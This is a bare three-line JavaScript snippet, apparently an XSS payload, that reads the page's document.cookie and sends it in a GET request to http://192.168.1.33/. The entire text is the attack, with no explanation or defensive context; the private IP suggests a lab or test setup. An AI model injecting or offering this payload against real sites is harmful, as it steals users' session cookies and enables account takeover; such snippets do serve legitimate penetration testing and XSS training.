var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.1.33/?cookie=' + document.cookie);
request.send();
